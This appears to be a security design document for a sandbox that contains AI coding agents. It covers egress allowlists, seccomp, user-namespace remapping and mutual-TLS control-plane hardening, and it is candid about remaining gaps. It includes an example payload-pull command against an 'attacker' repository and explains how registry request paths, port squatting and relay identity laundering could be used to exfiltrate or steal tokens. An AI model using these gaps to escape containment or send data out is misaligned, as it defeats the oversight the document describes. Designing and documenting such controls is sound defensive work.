# Mainguard Security Architecture — Sandbox Egress & Exfiltration Controls

**Status:** Living document · **Owner (long-term):** P2-17 (network transparency) · **Seeded by:** P2-07
(sandbox hardening + default-deny egress). This file states the accepted-and-stated residuals now so the
guarantee is honest before P2-17 expands it.

This document records the structural controls that bound prompt-injection exfiltration from an agent
sandbox, and — crucially — the **residual** that those controls do *not* close, so no reader mistakes
"default-deny egress" for "no exfiltration is possible."

## The layered controls (P2-07)

| # | Control | Kind | Where |
|---|---|---|---|
| S-1 | P2-06 quarantine: no git-host credential and no remote but the daemon bare mirror | STRUCT | `WorktreeManager` |
| G-15 | Hardened container spec: `no-new-privileges`, default-deny seccomp (moby default + the 3 memory-inspection denials), `CapDrop ALL`, **userns-remap (MG-17 — see below; enforced by the daemon config + the boot check, and the per-container `--userns=host` opt-out is a typed builder error)**, limits, read-only rootfs | STRUCT/CHECK | `ContainerSpecBuilder`, `UsernsRemapPolicy`, `FirstBootStep` |
| G-11 | ext4-only worktree mount; Windows/UNC sources rejected at construction | STRUCT | `ContainerSpecBuilder` |
| — | Default-deny egress: internal network + allowlist proxy + pinned DNS + iptables backstop | STRUCT/CHECK | `EgressProxyConfigurator` |
| A6 | Git host absent from the agent allowlist; the only path to it is the daemon read-only, prefix-allowlisted git proxy; push has no code path | STRUCT | `EgressAllowlist`, `DaemonGitProxy` |
| G2 | Anti-memory-inspection quartet, so the agent uid obtains zero bytes of the OOB key `K` | STRUCT | controls 1/3/4 in `ContainerSpecBuilder`; control 2 (`kernel.yama.ptrace_scope`) VM-wide in P2-05 |

## MG-17 — the user-namespace remap, and what it is (and is not)

This row used to say "userns" while `/etc/docker/daemon.json` set **no** `userns-remap` and the
container spec's `UsernsMode` was an empty string. With no daemon-level remap the empty string means
"do what the daemon does", i.e. nothing: container uid 0 **was** host uid 0, and the agent CLI's
container uid 1000 **was** the VM's `mainguard` service user — the uid that owns the daemon, its
keyring, its SQLite state and every binary the jails execute. Every byte a jail wrote through a bind
mount landed owned by the most privileged unprivileged identity in the VM.

dockerd now runs with `"userns-remap": "mainguard"` and a **pinned** subordinate range
(`/etc/subuid`+`/etc/subgid` = `mainguard:100000:65536`), so container id *N* maps to host id
*100000 + N*: container root → 100000, the agent → 101000, the supervisor uid → 101001. Both remapped
identities own nothing else on the VM.

**Bind-mount ownership.** Docker does not chown bind-mount sources, and the daemon *creates and keeps
writing* the two read-write ones (`~/mainguard/repos`, `~/mainguard/worktrees`) while running
unprivileged as uid 1000 — so it can neither chown them to 101000 nor write a tree owned by it. They are
therefore **shared through a group whose gid IS the remapped agent gid** (`mainguard-jail` = 101000, of
which the daemon is a member), with the setgid bit on both parents so everything created inside inherits
it. That is stronger than an owner-chown would have been: the jail reads and writes the content it
needs, but owns neither tree (it cannot `chmod`/`chown`/replace them) and has **no** access at all to
anything else under `/home/mainguard`. The read-only `adapters` mount is `a+rX` and deliberately not in
that group; the read-only coordinator IPC dir already grants the traversal/connect bits it needs.

**MG-3 ordering.** `docs/design/mg-3-mediated-ref-updates.md` (the approved plan of record) names this
change as its prerequisite so that the per-agent repositories it introduces at
`<vmRoot>/agents/<hash>/<agentId>.git` are created with correct ownership *by construction*. That
parent directory is therefore provisioned here, ahead of use, with the same `2775
mainguard:mainguard-jail` setgid treatment — MG-3 has to do nothing about ownership at all, only make
the content of a new git dir group-writable (`core.sharedRepository=group`), because umask is a
property of the writing process and no parent directory can supply it. Nothing here makes flipping the
mirror mount to read-only (MG-3 Stage 3) harder: a read-only mount needs read+traverse only, which the
group already grants.

**The check, not the config.** `FirstBootStep`'s check phase asserts the remap is *in effect* — `docker
info` reports the `name=userns` security option **and** its `DockerRootDir` is
`/var/lib/docker/100000.100000`, which is the only direct evidence that the remap running is the one the
mount ownership was provisioned against. The probe's output is sentinel-framed so "docker answered
nothing" is a distinct, reported outcome and can never be read as a pass.

**Migration.** Turning the remap on relocates dockerd's whole storage root, so the previous root's
images, containers and networks become invisible rather than deleted. The images self-heal (the startup
auto-provision sees them as *Missing* and `docker load`s the bundled CI tars; image ids and the
`mainguard.image.version` labels ride the tar unchanged, so the MG-27 digest pin and the label check are
unaffected). Mainguard's containers and networks do not, so they are removed with the OLD daemon on the
one boot that performs the flip — which is also the single, one-time recreate of the shared egress proxy.

## A6 — no direct git-host egress

The agent's egress allowlist contains **no git-host entry** by default, and the UI marks a user-added
git-host entry as defeating A6. Git-sourced installs (`pip install git+https://…`, Go modules, git
submodules) are served by `DaemonGitProxy`: fetch/`upload-pack` **only**, only for allowlisted
`host + org` prefixes, performed daemon-side with the daemon's credentials (the sandbox never holds
git-host credentials — the P2-06 quarantine holds). Push/`receive-pack` has **no code path** — the
refusal is structural, audited (`egress_denied`), and transparency-logged.

## G2 — anti-memory-inspection quartet

The OOB `ControlFrame` forgery-[STRUCT] guarantee depends on the agent uid obtaining zero bytes of `K`.
Four controls ship together: (1) the `K` tmpfs is mode 0400 owned by a dedicated supervisor uid ≠ the
agent uid; (2) `kernel.yama.ptrace_scope ≥ 2` VM-wide (P2-05); (3) the seccomp profile denies
`process_vm_readv`/`process_vm_writev`/`ptrace`; (4) no `CAP_SYS_PTRACE`. The in-container memory scrape
is closed structurally by (3)+(4) alone; (1) closes the file path; (2) is defense-in-depth. The
container-spec builder asserts (1),(3),(4) on **every** create request; dropping any is a typed builder
error.

**Control (2) is machine-wide, by necessity (MG-33).** WSL2 runs every distro on ONE shared kernel and
`kernel.yama.ptrace_scope` is not namespaced, so the value `FirstBootStep` writes at first boot applies
to the user's *other* WSL2 distros too for as long as the WSL VM is up. It is strictly a hardening (it
restricts ptrace to admin-capable processes), never a weakening, but it is a real side effect outside
Mainguard's distro: a debugger/profiler attaching to an already-running pid in another distro may start
needing `sudo`. It is bounded and reversible — the live value resets on the next full `wsl --shutdown`,
and the persisted `/etc/sysctl.d/99-mainguard-sandbox.conf` drop-in lives *inside* `MainguardEnv`, so it
goes away with the distro at uninstall. Per-distro scoping is impossible (non-namespaced sysctl) and
Docker rejects it as a per-container `--sysctl`, which is why it is boot-provisioned VM-wide and
disclosed in the OOBE progress log rather than narrowed.

The shipped seccomp profile is the **canonical moby/containerd default-deny profile**
(`defaultAction: SCMP_ACT_ERRNO`, the standard `archMap` and ~300-syscall allowlist) with the three
memory-inspection syscalls removed from every allow rule and explicitly denied — so the agent keeps the
full default hardening (`mount`/`bpf`/`pivot_root` stay capability-gated and, under `CapDrop ALL`,
unreachable; `kexec_load` et al. are default-denied) on top of the G2 denials. Because a custom
`seccomp=<json>` **replaces** Docker's default rather than layering onto it, the profile reproduces that
default; it is never `unconfined`. It is a single source of truth: `images/mainguard-agent-base/seccomp.json`
is embedded into `Mainguard.Agents` (`SeccompProfile.Json`) and passed to `CreateContainerAsync` verbatim, so
what the tests assert equals what the container runs.

## F5 — the package-proxy caveat (accepted-and-stated residual)

**"Pull-only" ≠ "cannot fetch attacker code" ≠ "cannot exfiltrate."** A wholesale allowlisted *language*
proxy (Go proxy, npm, crates) is a general-purpose fetch channel: `go get github.com/attacker/payload`
resolves a second-stage payload and leaks bytes in the request path even though the git host itself is
off the agent allowlist. A6 removes the *direct* git route; it does **not** by itself close
payload-pull or low-bandwidth request-path exfiltration through an allowlisted registry.

Compensating controls, in order of preference:

1. **Declared-dependency scoping (preferred).** Module fetches route through the daemon proxy with
   `DeclaredDependencyResolver` resolving `go.mod`/`package.json`/lockfiles to the exact module set;
   requests outside it are denied (typed `DeclaredDependencyDeniedException`) and logged.
2. **Transparency + anomaly.** Where a native registry front cannot be replaced (protocol constraints),
   every package-proxy fetch is a P2-17 transparency line **and** a P2-44 anomaly signal — never silent.

**The accepted residual:** public-payload pull plus low-bandwidth request-path exfiltration via an
allowlisted registry is **accepted and stated**. It is bounded by:

- **no push / no credentials** — nothing an agent fetches lets it write to the git host or exfiltrate
  through it; the sandbox holds no git-host credential (S-1);
- **the verify → review → flagged-gate → human-merge backstop** — whatever an injected agent produces is
  still untrusted code facing human review before any merge. This human-review backstop, not egress, is
  what actually bounds a determined exfiltrator; egress raises the cost, it is not a proof of no-exfil.

This residual is intentional and re-stated here so the security posture is honest: the controls above
make exfiltration expensive and observable, not impossible.

---

## The control plane: loopback is not a boundary (MG-19)

The daemon's gRPC control plane binds `127.0.0.1:5250` **inside the MainguardEnv WSL2 VM**, while the GUI
runs on Windows. It used to serve **cleartext h2c** with a per-session bearer token as the *sole* gate.
That is not sufficient, for reasons that were measured rather than assumed.

### The `localhostForwarding` exposure (measured)

WSL2 enables `localhostForwarding` by default. It relays a Windows-side `127.0.0.1:<port>` connection into
the in-VM listener, which means **"bound to loopback" buys no isolation at all**: the daemon port is
reachable from any process in the Windows user's session, and — because all WSL2 distros share one
network stack under the default NAT mode — from the user's *other* distros too. Measured on
Windows 11 (10.0.26200) with WSL2:

| # | Measurement | Result |
|---|---|---|
| 1 | Windows .NET process → `127.0.0.1:<port>`, listener bound to `127.0.0.1` inside the VM | **CONNECTED** — the relay is real and transparent |
| 2 | The in-VM listener's view of that peer | `127.0.0.1:<ephemeral>`, `/proc/net/tcp` **`uid=0`**, owning pid not visible in the user namespace |
| 3 | `SO_PEERCRED` on that accepted TCP socket | `pid=0 uid=-1 gid=-1` — meaningless (it is a Unix-socket facility) |

Measurement 2 is the important one: **the relay launders peer identity.** Even if a peer credential could
be read on the TCP path, it would describe the WSL relay (root, in-VM), never the Windows process that
actually made the call. No peer-authentication scheme can be built on the loopback TCP path itself.

### Why not a Unix-domain socket + `SO_PEERCRED`

This was the first choice, and it was measured and **rejected**: it cannot work for the shipped topology.
The daemon is in the VM and the GUI is on Windows, and an AF_UNIX socket inside the VM is not connectable
from a Windows process.

| # | Measurement | Result |
|---|---|---|
| 4 | In-VM UDS at `$HOME/…/daemon.sock`, in-VM client | CONNECTED; `SO_PEERCRED` returns a real `pid`/`uid`/`gid` |
| 5 | Windows .NET process → that socket via `\\wsl.localhost\<distro>\home\…\daemon.sock` | **`SocketException` `NetworkDown` (WSAENETDOWN, 10050)** |
| 6 | Control: Windows .NET process → an AF_UNIX socket it created on the Windows filesystem | CONNECTED — so measurement 5 is a real negative, not a broken-AF_UNIX artifact |

The 9P share *displays* the socket (`File.Exists` is `true`, attributes `ReparsePoint`, length 0), which
makes this failure mode easy to mistake for a path bug. It is not: 9P carries no socket semantics, so
there is nothing to `connect()` to. A UDS control plane would require an in-VM relay process bridging
back to a TCP port — reintroducing exactly the exposure above, with an extra hop.

### What shipped instead: pinned mutual TLS

The control-plane listener now requires **mutually-authenticated TLS**, with both ends pinned by SHA-256
fingerprint to material minted fresh on every daemon start (`SessionTransportCertificates`, written beside
`daemon.token` with the same `0600` / single-ACE-DACL protection). There is deliberately **no plaintext
fallback and no downgrade knob** — the client throws rather than connect unauthenticated.

What this closes:

1. **The token no longer crosses the wire in cleartext.** Every RPC used to carry it in plaintext across
   loopback and the WSL relay, harvestable by anything that could observe local traffic.
2. **Port squatting.** The client used to hand its bearer token to whatever answered on `127.0.0.1:5250`,
   with no way to tell. An unprivileged process that bound the port before `mainguardd` started could
   collect the operator token on the first RPC. The client now pins the daemon's certificate, so the
   handshake with an impostor fails *before any HTTP/2 frame is written* — the token is never sent.
3. **Unauthenticated reachability.** A peer without the pinned client certificate is rejected during the
   TLS handshake, before the HTTP/2 parser, the gRPC dispatcher, and `BearerTokenInterceptor`.

**The accepted residual — stated plainly.** A process running as the **same OS user** can read
`daemon-client.pfx` beside the token and impersonate the client. No local transport defeats a same-uid
attacker: a `0600` Unix socket with `SO_PEERCRED` would not have either, because the peer uid would match.
The honest claim is that the bar moves from *read one file* to *read two files and complete a mutual
handshake*, and that the sniffing and port-squatting vectors close outright. A host-un-forgeable presence
factor remains deferred (OPS §10.1), and `PeerCredentialIdentityResolver` still resolves the daemon's own
identity — the connection now carries a genuine peer credential, so deriving approver identity from the
client certificate is unblocked future work, not something already done.

---

## Runtime toolchain: pre-baked, not `devbox add` (A6 decision)

The design intent was that agents sideload toolchains at runtime via `devbox add <tool>`. In a strict
A6 jail this is not achievable: devbox resolves packages through nixhub and then fetches **nixpkgs from
github** (`api.github.com` / `github.com/NixOS/nixpkgs/archive/<rev>.tar.gz`) at run time — reaching the
git host A6 exists to keep off the agent's egress. Every strict-A6 workaround (pinning `nixpkgs.commit`,
an exact-commit flakeref, a local `path:` nixpkgs) either still re-fetches github or requires a full,
slow local nixpkgs evaluation.

**Decision:** the curated toolchain (jq, ripgrep, fd, tree, gnumake, nodejs, python3, go) is **Nix-installed
at image-build time** into a persistent `/opt/toolchain` profile that is on the agent's PATH from the
read-only image. At runtime the tools are present and runnable with **zero egress** — no git host, no
nixhub, not even `cache.nixos.org` — so A6 stays fully intact and the read-only rootfs is preserved (no
writable `/nix` volume). A fixed, audited toolchain is also a *stronger* posture than arbitrary runtime
package pulls: it closes the general-purpose fetch/exfil channel the F5 caveat above describes.

**Accepted residual → filed as P2-46 (the lead v1.x feature):** an agent cannot add an *arbitrary* new
tool at runtime. The A6-clean solution — a **daemon-mediated** nix resolver + binary mirror that resolves
and fetches the closure daemon-side (the daemon being the only component permitted a git host / nixhub,
exactly as the P2-06 read-only git proxy is) and injects it into the jail, keeping the git host off the
*agent* allowlist — is specified as **P2-46** in the master implementation document and slated as the
first post-v1.0 feature. The `devbox` binary is baked so that path can be built on later.
